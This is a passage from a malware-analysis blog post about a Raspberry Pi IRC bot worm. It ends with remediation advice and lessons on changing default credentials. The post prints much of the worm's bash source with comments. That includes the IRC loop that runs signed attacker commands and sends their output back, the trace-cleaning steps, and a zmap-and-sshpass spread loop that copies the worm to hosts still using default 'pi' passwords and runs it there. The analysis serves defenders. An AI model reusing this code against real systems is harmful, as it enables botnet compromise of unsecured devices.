      <span style=color:#75715e># NO `sleep` statement here... will check endlessly as fast as possible; silly</span>
  <span style=color:#66d9ef>fi</span>
  ...
</code></pre></div><p>It appears that this bot uses the <a href=https://www.undernet.org/>UnderNet</a> IRC system to establish connections with. Let&rsquo;s take a look at UnderNet— perhaps we can find IRC channels (specifically <code>#biret</code>) related to this malware. For reference, <code>#biret</code> is the channel that this script initiates connections to.</p>
<p><img loading=lazy src=/media/fishing-for-malware-4-1.png alt="Screenshot of UnderNet IRC channel list">
</p>
<p><em>Sigh</em>. IRC&mldr; A relic that is perhaps best forgotten in some aspects. Two other users, which I have deliberately not shown here, are active at the time of writing this post in <code>#biret</code>. <em>In fact, one of the active users has the name of a compromised target device!</em></p>
<h4 id=main-logic>Main Logic<a hidden class=anchor aria-hidden=true href=#main-logic>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...
  echo $NICK

  eval <span style=color:#e6db74>&#39;printf &#34;NICK $NICK\r\n&#34; &gt;&amp;3;&#39;</span>
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
      <span style=color:#66d9ef>continue</span>
  <span style=color:#66d9ef>fi</span>
  eval <span style=color:#e6db74>&#39;printf &#34;USER user 8 * :IRC hi\r\n&#34; &gt;&amp;3;&#39;</span>
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
    <span style=color:#66d9ef>continue</span>
  <span style=color:#66d9ef>fi</span>

  <span style=color:#75715e># Main loop</span>
  <span style=color:#66d9ef>while</span> <span style=color:#f92672>[</span> true <span style=color:#f92672>]</span>; <span style=color:#66d9ef>do</span>
    eval <span style=color:#e6db74>&#34;read msg_in &lt;&amp;3;&#34;</span> // Examine the contents of msg_in recieved from the TCP host-IRC connection

    <span style=color:#75715e># If msg_in is null, quit the main loop</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
      break
    <span style=color:#66d9ef>fi</span>

    <span style=color:#75715e># On IRC in = &#39;PING&#39;, respond &#39;PONG&#39; via IRC</span>
    <span style=color:#75715e># Presumably to test connectivity?</span>
    <span style=color:#66d9ef>if</span>  <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$msg_in<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span>~ <span style=color:#e6db74>&#34;PING&#34;</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
      printf <span style=color:#e6db74>&#34;PONG %s\n&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>msg_in:5<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>;
      eval <span style=color:#e6db74>&#39;printf &#34;PONG %s\r\n&#34; &#34;${msg_in:5}&#34; &gt;&amp;3;&#39;</span>
      <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
        break
      <span style=color:#66d9ef>fi</span>
      sleep <span style=color:#ae81ff>1</span>

      // If msg_in is null, quit the main loop
      eval <span style=color:#e6db74>&#39;printf &#34;JOIN #biret\r\n&#34; &gt;&amp;3;&#39;</span>
      <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
        break
      <span style=color:#66d9ef>fi</span>

    <span style=color:#75715e># `=~` is a bash regex operator which searches for &#39;PRIVMSG&#39; within $msg_in</span>
    <span style=color:#75715e># So, if &#39;PRIVMSG&#39; is somewhere within $msg_in, continue</span>
    <span style=color:#66d9ef>elif</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$msg_in<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span>~ <span style=color:#e6db74>&#34;PRIVMSG&#34;</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>

      <span style=color:#75715e># Cut $msg_in, extracting the relevant elements:</span>
      <span style=color:#75715e># - A section to be hashed</span>
      <span style=color:#75715e># - A data section containing instructions</span>
      <span style=color:#75715e># - The IRC nickname of the host</span>
      privmsg_h<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $msg_in| cut -d<span style=color:#e6db74>&#39;:&#39;</span> -f 3<span style=color:#66d9ef>)</span>
      privmsg_data<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $msg_in| cut -d<span style=color:#e6db74>&#39;:&#39;</span> -f 4<span style=color:#66d9ef>)</span>
      privmsg_nick<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $msg_in| cut -d<span style=color:#e6db74>&#39;:&#39;</span> -f <span style=color:#ae81ff>2</span> | cut -d<span style=color:#e6db74>&#39;!&#39;</span> -f 1<span style=color:#66d9ef>)</span>

      <span style=color:#75715e># Get an MD5 hash of the data from $msg_in</span>
      <span style=color:#75715e># Use $privmsg_h to sign the public key generated earlier</span>
      <span style=color:#75715e># Use: Ensure attacks come from the original attacker</span>
      hash<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo $privmsg_data | base64 -d -i | md5sum | awk -F<span style=color:#e6db74>&#39; &#39;</span> <span style=color:#e6db74>&#39;{print $1}&#39;</span><span style=color:#e6db74>`</span>
      sign<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin<span style=color:#e6db74>`</span>

      <span style=color:#75715e># If the sign is genuine (signed with the attackers public key)</span>
      <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$sign<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;</span>$hash<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
        CMD<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>echo $privmsg_data | base64 -d -i<span style=color:#e6db74>`</span> // Then grab the command to execute
        RES<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>bash -c <span style=color:#e6db74>&#34;</span>$CMD<span style=color:#e6db74>&#34;</span> | base64 -w 0<span style=color:#e6db74>`</span>
        eval <span style=color:#e6db74>&#39;printf &#34;PRIVMSG $privmsg_nick :$RES\r\n&#34; &gt;&amp;3;&#39;</span> // Echo command back to attacker?

        <span style=color:#75715e># If msg_in is null, quit the main loop</span>
        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
          break
        <span style=color:#66d9ef>fi</span>
      <span style=color:#66d9ef>fi</span>
    <span style=color:#66d9ef>fi</span>
  <span style=color:#66d9ef>done</span>
<span style=color:#66d9ef>done</span>
EOFMARKER
...
</code></pre></div><p>The main execution loop has several interesting elements. Essentially, the attacker establishes communication with the victim host via IRC and signs their attacks to ensure no other malicious actor can take advantage of the exploit. Very creative — this is likely also why no commands I sent to victim hosts in <code>#biret</code> responded to requests.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...
chmod +x /tmp/$BOT <span style=color:#75715e># Makes script executable so that it can run on other systems</span>
nohup /tmp/$BOT 2&gt;&amp;<span style=color:#ae81ff>1</span> &gt; /tmp/bot.log &amp; <span style=color:#75715e># Ensures that the script is not stopped upon user logoff or any other hang events</span>

<span style=color:#75715e># Clean traces</span>
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep <span style=color:#ae81ff>3</span>
rm -rf /tmp/$BOT

<span style=color:#75715e># Generate a new name</span>
NAME<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span>

date &gt; /tmp/.s

<span style=color:#75715e># Install:</span>
<span style=color:#75715e># - ZMap: a network scanner</span>
<span style=color:#75715e># - sshpass: a utility that allows for keyboard-interactive SSH sessions in non-interactive (automated) sessions</span>
apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

<span style=color:#75715e># SPREAD LOOP</span>
<span style=color:#66d9ef>while</span> <span style=color:#f92672>[</span> true <span style=color:#f92672>]</span>; <span style=color:#66d9ef>do</span>
  FILE<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp<span style=color:#e6db74>`</span>

  <span style=color:#75715e># Collect all IPs with port 22 open</span>
  zmap -p <span style=color:#ae81ff>22</span> -o $FILE -n <span style=color:#ae81ff>100000</span>
  killall ssh scp
  <span style=color:#66d9ef>for</span> IP in <span style=color:#e6db74>`</span>cat $FILE<span style=color:#e6db74>`</span>

  <span style=color:#75715e># For each IP with 22 open, attempt to log in awith the credential set pi:praspberry</span>
  <span style=color:#75715e># If a connection succeeds:</span>
  <span style=color:#75715e># SPREAD AND EXECUTE THE SCRIPT</span>
  <span style=color:#66d9ef>do</span>
    sshpass -praspberry scp -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no $MYSELF pi@$IP:/tmp/$NAME  <span style=color:#f92672>&amp;&amp;</span> echo $IP &gt;&gt; /opt/.r <span style=color:#f92672>&amp;&amp;</span> sshpass -praspberry ssh pi@$IP -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no <span style=color:#e6db74>&#34;cd /tmp &amp;&amp; chmod +x </span>$NAME<span style=color:#e6db74> &amp;&amp; bash -c ./</span>$NAME<span style=color:#e6db74>&#34;</span> &amp;
    sshpass -praspberryraspberry993311 scp -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no $MYSELF pi@$IP:/tmp/$NAME  <span style=color:#f92672>&amp;&amp;</span> echo $IP &gt;&gt; /opt/.r <span style=color:#f92672>&amp;&amp;</span> sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no <span style=color:#e6db74>&#34;cd /tmp &amp;&amp; chmod +x </span>$NAME<span style=color:#e6db74> &amp;&amp; bash -c ./</span>$NAME<span style=color:#e6db74>&#34;</span> &amp;
  <span style=color:#66d9ef>done</span>
  rm -rf $FILE // Clean traces
  sleep <span style=color:#ae81ff>10</span>
<span style=color:#66d9ef>done</span>

<span style=color:#66d9ef>fi</span>
</code></pre></div><p>And here we have the finale: as with so many other malicious binaries, it attempts to spread where it can, trying to infect any unsecured Raspberry Pi on the local network. For a user with many new Raspberry Pis, I imagine this attack would prove very effective, netting many hosts.</p>
<h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>This was certainly an interesting script to behold. From the methodology employed by the attacker to control remote machines to the attack signing, it is evident that significant thought went into the development of this script. I would love the opportunity to anonymously interview the attacker&mldr; How many hosts were infected? Were infected hosts primarily useless, residential hobby computers? Was it possible to pivot from infected Raspberry pis to more important targets? Abstracting the unethicality of the development of malware, the creativity demonstrated here is remarkable and has made for quite an engaging learning experience.</p>
<p><em>Note: I do not condone the development or distribution of malware outside of educational contexts.</em></p>
<blockquote>
<p>What should I do if I find this script on my Raspberry Pi?</p>
</blockquote>
<p>Immediately disconnect the device from the network and eject the storage medium. Mount it on an external device, back up any needed data, and then wipe all data. Reinstall the OS as normal. Do not attempt to manually remove the malware, as there is no reliable record of extra steps the attacker may have taken.</p>
<blockquote>
<p>What can we learn from this attack?</p>
</blockquote>
<p>Always, always, <em>always</em> secure services and minimize service visibility on the Internet. This attack would not function without the ability to deposit itself onto a host. Further, change default passwords for every account and service, even those not used. This script takes advantage of negligence in that regard, searching for hosts with the default Rasberry Pi credentials to pivot to.</p>
<p>Stay safe online, and thank you so much for reading.</p>
<hr>
<p><strong><a href=/media/fishing-for-malware-5>Fishing for Malware: Part 5 →</a></strong><br>
<strong><a href=/media/fishing-for-malware-3>← Fishing for Malware: Part 3</a></strong></p>
<p>I am open to comments and criticism — I learn alongside you. Please, do not hesitate to <a href="mailto:contact@swlacy.com?subject=Blog%20Edit%20Suggestion">suggest an edit</a>.</p>
<hr>
<p>Sid Lacy<br>
<a href="mailto:contact@swlacy.com?subject=Hello!">Email</a> • <a href=https://www.linkedin.com/in/lacysw/>LinkedIn</a> • <a href=https://github.com/lacysw>GitHub</a></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://swlacy.com/tags/analysis/>analysis</a></li>
<li><a href=https://swlacy.com/tags/projects/>projects</a></li>
</ul><div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on twitter" href="https://twitter.com/intent/tweet/?text=Fishing%20for%20Malware%20%e2%80%94%20Part%20Four%3a%20Raspberry%20Pi%20IRC%20Bot&url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f&hashtags=analysis%2cprojects"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5.0 86.7-66 186.6-186.6 186.6-37.2.0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7.0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447.0 01-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9.0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48A48 48 0 000 80v352a48 48 0 0048 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.27c-30.81.0-40.42 19.12-40.42 38.73V256h68.78l-11 71.69h-57.78V480H4e2a48 48 0 0048-48V80a48 48 0 00-48-48z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f&title=Fishing%20for%20Malware%20%e2%80%94%20Part%20Four%3a%20Raspberry%20Pi%20IRC%20Bot"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M283.2 345.5c2.7 2.7 2.7 6.8.0 9.2-24.5 24.5-93.8 24.6-118.4.0-2.7-2.4-2.7-6.5.0-9.2 2.4-2.4 6.5-2.4 8.9.0 18.7 19.2 81 19.6 100.5.0 2.4-2.3 6.6-2.3 9 0zm-91.3-53.8c0-14.9-11.9-26.8-26.5-26.8-14.9.0-26.8 11.9-26.8 26.8.0 14.6 11.9 26.5 26.8 26.5 14.6.0 26.5-11.9 26.5-26.5zm90.7-26.8c-14.6.0-26.5 11.9-26.5 26.8.0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-11.9 26.8-26.5.0-14.9-11.9-26.8-26.8-26.8zM448 80v352c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5.0 48 21.5 48 48zm-99.7 140.6c-10.1.0-19 4.2-25.6 10.7-24.1-16.7-56.5-27.4-92.5-28.6l18.7-84.2 59.5 13.4c0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-12.2 26.8-26.8.0-14.6-11.9-26.8-26.8-26.8-10.4.0-19.3 6.2-23.8 14.9l-65.7-14.6c-3.3-.9-6.5 1.5-7.4 4.8l-20.5 92.8c-35.7 1.5-67.8 12.2-91.9 28.9-6.5-6.8-15.8-11-25.9-11-37.5.0-49.8 50.4-15.5 67.5-1.2 5.4-1.8 11-1.8 16.7.0 56.5 63.7 102.3 141.9 102.3 78.5.0 142.2-45.8 142.2-102.3.0-5.7-.6-11.6-2.1-17 33.6-17.2 21.2-67.2-16.1-67.2z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on ycombinator" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f&t=Fishing%20for%20Malware%20%e2%80%94%20Part%20Four%3a%20Raspberry%20Pi%20IRC%20Bot"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM21.2 229.2H21c.1-.1.2-.3.3-.4.0.1.0.3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f&title=Fishing%20for%20Malware%20%e2%80%94%20Part%20Four%3a%20Raspberry%20Pi%20IRC%20Bot"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Four: Raspberry Pi IRC Bot on whatsapp" href="https://api.whatsapp.com/send?text=Fishing%20for%20Malware%20%e2%80%94%20Part%20Four%3a%20Raspberry%20Pi%20IRC%20Bot%20-%20https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-4%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224 122.8c-72.7.0-131.8 59.1-131.9 131.8.0 24.9 7 49.2 20.2 70.1l3.1 5-13.3 48.6 49.9-13.1 4.8 2.9c20.2 12 43.4 18.4 67.1 18.4h.1c72.6.0 133.3-59.1 133.3-131.8.0-35.2-15.2-68.3-40.1-93.2-25-25-58-38.7-93.2-38.7zm77.5 188.4c-3.3 9.3-19.1 17.7-26.7 18.8-12.6 1.9-22.4.9-47.5-9.9-39.7-17.2-65.7-57.2-67.7-59.8s-16.2-21.5-16.2-41 10.2-29.1 13.9-33.1c3.6-4 7.9-5 10.6-5 2.6.0 5.3.0 7.6.1 2.4.1 5.7-.9 8.9 6.8 3.3 7.9 11.2 27.4 12.2 29.4s1.7 4.3.3 6.9c-7.6 15.2-15.7 14.6-11.6 21.6 15.3 26.3 30.6 35.4 53.9 47.1 4 2 6.3 1.7 8.6-1 2.3-2.6 9.9-11.6 12.5-15.5 2.6-4 5.3-3.3 8.9-2 3.6 1.3 23.1 10.9 27.1 12.9s6.6 3 7.6 4.6c.9 1.9.9 9.9-2.4 19.1zM4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM223.9 413.2c-26.6.0-52.7-6.7-75.8-19.3L64 416l22.5-82.2c-13.9-24-21.2-51.3-21.2-79.3C65.4 167.1 136.5 96 223.9 96c42.4.0 82.2 16.5 112.2 46.5 29.9 30 47.9 69.8 47.9 112.2.0 87.4-72.7 158.5-160.1 158.5z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>Copyright &copy; 2022 Sid Lacy •
Last Built 2022.02.12 UTC •
<a href=/attribution>Attribution</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Jump to Top" class=top-link id=top-link accesskey=g><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-up" class="svg-inline--fa fa-arrow-up fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='Copy ⧉';function d(){a.innerText='Copied!',setTimeout(()=>{a.innerText='Copy ⧉'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
<script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{background:'#00000000'})})</script></body>
</html>